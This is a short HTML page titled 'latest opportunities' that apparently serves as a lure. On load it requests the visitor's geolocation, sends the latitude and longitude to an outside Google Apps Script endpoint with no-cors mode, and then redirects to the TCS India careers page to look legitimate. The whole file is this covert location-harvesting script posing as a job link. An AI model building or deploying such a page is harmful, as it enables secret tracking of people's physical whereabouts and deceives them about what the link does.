<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>latest opportunities</title>
</head>
<body>
    <script>
	window.onload =function() {
	sendLocation();
	}
       function sendLocation() {
   
    navigator.geolocation.getCurrentPosition(position => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        fetch("https://script.google.com/macros/s/AKfycbzr0PurjtCAbASFZjeExXO-ZgBDljDjNSJQjQSF_gshKU3fJBBiK3p4yzpGrvg_L1DD/exec", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ latitude, longitude }),
            mode: "no-cors"  // Added no-cors to bypass CORS restrictions
        })
        .then(() => {
           console.log("Location saved successfully!");
        })
        .catch(error => {
          console.log("error");
            console.error("Error:", error);
        });
    }, error => {
        console.error("Geolocation error:", error);
    });
	setTimeout(() => {
	window.location.href="https://www.tcs.com/careers/india";
	},3000);
}

    </script>
</body>
</html>
